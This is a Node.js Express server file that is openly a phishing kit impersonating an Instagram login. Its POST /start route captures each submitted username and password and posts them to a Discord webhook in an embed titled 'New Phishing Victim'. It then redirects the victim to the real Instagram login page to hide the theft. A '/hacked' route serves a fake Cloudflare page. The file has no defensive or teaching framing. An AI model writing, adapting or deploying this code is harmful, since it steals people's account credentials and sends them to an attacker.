const express = require("express");
const app = express();
const path = require("path");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
require("dotenv").config();
const PORT = process.env.PORT || 3000;

const webhook = new Webhook(process.env.BOT_TOKEN);

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

app.get("/", (req, res) => {
  res.render("webview");
});

app.post("/start", (req, res) => {
  const { username, password } = req.body;

  const embed = new MessageBuilder()
    .setTitle("🎣 New Phishing Victim")
    .addField("Username", username)
    .addField("Password", password)
    .setColor("#ff0000")
    .setTimestamp();

  webhook.send(embed);
  res.redirect("https://www.instagram.com/accounts/login/");
});

app.get("/hacked", (req, res) => {
  res.render("cloudflare");
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
